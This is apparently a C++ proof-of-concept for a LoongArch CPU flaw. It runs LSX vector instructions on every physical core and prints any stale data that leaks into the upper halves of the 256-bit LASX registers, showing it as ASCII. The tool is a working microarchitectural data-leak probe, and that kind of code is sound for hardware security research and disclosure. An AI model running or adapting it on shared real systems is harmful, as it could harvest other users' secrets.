// PoC: detect data leaks into upper 128 bits of LASX $xr registers
// when executing LSX (128-bit SIMD) instructions.
//
// LoongArch: $vr registers (128-bit, LSX) alias the lower half of $xr (256-bit,
// LASX). LSX instructions should only write the lower 128 bits ($vr). The upper
// 128 bits should remain untouched. If they change, it indicates a
// microarchitectural leak.
//
// Usage:
//   g++ -std=c++11 -O2 -march=native -pthread -o loongbleed_poc
//   loongbleed_poc.cpp
//   ./loongbleed_poc

#include <assert.h>
#include <pthread.h>
#include <sched.h>
#include <set>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Each 64-byte chunk:
//   [ 0..31] = input pattern for $xr (256 bits)
//   [32..63] = $xr after LSX instruction (written by gadget)
#define CHUNK_SIZE 64
#define REPEAT 16
#define BUF_SIZE (CHUNK_SIZE * REPEAT)

// ---- Global state (shared seen set, protected by mutex) ----
static volatile int running = 1;
static int num_online_cpus;
static int
    *thread_cpus; // list of logical CPUs to pin to (one per physical core)

static std::set<std::pair<uint64_t, uint64_t>> seen;
static pthread_mutex_t seen_lock = PTHREAD_MUTEX_INITIALIZER;

// ---- Signal handler for clean shutdown ------------------------------------
static void sigint_handler(int) { running = 0; }

// ---- Gadget ----------------------------------------------------------------
// Inline assembly: load 256-bit pattern into $xr0, run an LSX instruction
// (vor.v) on $vr0, then store the full 256-bit result.
//
// Arguments:
//   a0 (x0 = buf)  -- pointer to current chunk
//
// The "memory" clobber ensures the compiler reloads/stores around the asm.
static void __attribute__((noinline)) test_gadget(char *buf) {
  char *p = buf;
  for (int j = 0; j < REPEAT; j++) {
    __asm__ volatile("xvld  $xr0, %0, 0\n\t"
                     "vor.v $vr0, $vr0, $vr0\n\t"
                     "xvst  $xr0, %0, 32\n\t"
                     :
                     : "r"(p)
                     : "$xr0", "memory");
    p += CHUNK_SIZE;
  }
}

// ---- Per-thread worker -----------------------------------------------------
static void *worker(void *arg) {
  int cpu = *(int *)arg;

  // Pin to the specified logical CPU
  cpu_set_t cpuset;
  CPU_ZERO(&cpuset);
  CPU_SET(cpu, &cpuset);
  if (sched_setaffinity(0, sizeof(cpuset), &cpuset) != 0) {
    perror("sched_setaffinity");
    return NULL;
  }

  // Aligned buffer for LASX loads/stores (32-byte alignment required)
  char buf[BUF_SIZE] __attribute__((aligned(32)));

  // Initialise input pattern: all zeros.  Any non-zero upper bits = leak.
  memset(buf, 0, BUF_SIZE);

  printf("[cpu %2d] thread started, pinning to CPU %d\n", cpu, cpu);

  while (running) {
    // Clear the result area (bytes 32..63 of each chunk)
    for (int i = 0; i < REPEAT; i++)
      memset(buf + CHUNK_SIZE * i + 32, 0, 32);

    // Run the gadget
    test_gadget(buf);

    // Check for leaked data in the upper 128 bits of each chunk
    for (int j = 0; j < REPEAT; j++) {
      uint64_t *chunk = (uint64_t *)(buf + CHUNK_SIZE * j);
      uint64_t leaked_lo = chunk[6];
      uint64_t leaked_hi = chunk[7];

      if (leaked_lo == 0 && leaked_hi == 0)
        continue;

      pthread_mutex_lock(&seen_lock);
      auto key = std::make_pair(leaked_lo, leaked_hi);
      if (seen.find(key) == seen.end()) {
        seen.insert(key);

        // Only print if all 16 bytes are valid ASCII
        uint8_t *p = (uint8_t *)&leaked_lo;
        uint8_t *q = (uint8_t *)&leaked_hi;
        int all_ascii = 1;
        for (int i = 0; i < 8 && all_ascii; i++)
          if (p[i] < 0x20 || p[i] > 0x7e)
            all_ascii = 0;
        for (int i = 0; i < 8 && all_ascii; i++)
          if (q[i] < 0x20 || q[i] > 0x7e)
            all_ascii = 0;

        if (all_ascii) {
          printf("[cpu %3d] LEAK chunk=%2d  "
                 "upper=0x%016lx_%016lx  ascii=",
                 cpu, j, leaked_hi, leaked_lo);
          for (int i = 0; i < 8; i++)
            putchar(p[i]);
          for (int i = 0; i < 8; i++)
            putchar(q[i]);
          putchar('\n');
          fflush(stdout);
        }
      }
      pthread_mutex_unlock(&seen_lock);
    }
  }
  return NULL;
}

// ---- CPU topology discovery ------------------------------------------------
// On LoongArch with SMT-2: even-numbered logical CPUs are the first SMT thread
// of each physical core.  We pick one per physical core (the even ones).
static int discover_cpus(void) {
  long n = sysconf(_SC_NPROCESSORS_CONF);
  if (n <= 0) {
    fprintf(stderr, "Cannot determine number of CPUs\n");
    return -1;
  }
  thread_cpus = (int *)malloc(sizeof(int) * (n / 2 + 1));
  if (!thread_cpus)
    return -1;

  int count = 0;
  for (int cpu = 0; cpu < n; cpu += 2)
    thread_cpus[count++] = cpu;

  num_online_cpus = count;
  return count;
}

// ---- Main ------------------------------------------------------------------
int main(void) {
  printf("=== LSX upper-128-bit leak detector (multithreaded) ===\n");
  printf("Detecting data leaks into upper 128 bits of $xr registers\n");
  printf("when executing LSX instructions.\n\n");

  int n_threads = discover_cpus();
  if (n_threads <= 0) {
    fprintf(stderr, "Failed to discover CPU topology\n");
    return 1;
  }

  printf("Discovered %d physical cores, launching one thread per core\n",
         n_threads);
  printf("Thread-to-CPU mapping:\n");
  for (int i = 0; i < n_threads; i++)
    printf("  thread[%2d] -> CPU %d\n", i, thread_cpus[i]);
  printf("\n");

  // Launch threads
  pthread_t *threads = (pthread_t *)malloc(sizeof(pthread_t) * n_threads);
  assert(threads);

  for (int i = 0; i < n_threads; i++) {
    if (pthread_create(&threads[i], NULL, worker, &thread_cpus[i]) != 0) {
      perror("pthread_create");
      running = 0;
      n_threads = i;
      break;
    }
  }

  printf("Running... press Ctrl+C to stop\n");
  fflush(stdout);

  signal(SIGINT, sigint_handler);

  while (running)
    pause();

  // Join threads
  for (int i = 0; i < n_threads; i++)
    pthread_join(threads[i], NULL);

  free(threads);
  free(thread_cpus);
  printf("\n=== Done ===\n");
  return 0;
}
